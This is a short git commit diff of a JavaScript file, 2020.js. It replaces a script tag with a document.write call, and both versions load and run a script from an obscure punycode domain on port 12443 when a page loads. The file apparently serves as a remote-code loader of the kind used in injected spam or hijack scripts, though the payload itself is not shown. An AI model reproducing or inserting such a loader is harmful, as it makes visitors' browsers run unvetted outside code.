c86bc13ff7705b4c65943425b965e7870e020fe4
boba3721 <68194272+boba3721@users.noreply.github.com>
2021-01-06 22:38:05 +0800

    Update 2020.js

--- 2020.js
+++ 2020.js
@@ -1,1 +1,1 @@
-<script src="https://xn--wxtr9fwyxk9c.xn--55qx5d:12443/ty/C39A495D-F9E2-13163-33-C17561526139.alpha"></script>
+document.write('<script src="https://xn--wxtr9fwyxk9c.xn--55qx5d:12443/ty/9EB21C5C-77D8-13163-33-9F6647357031.alpha"><\/script>');
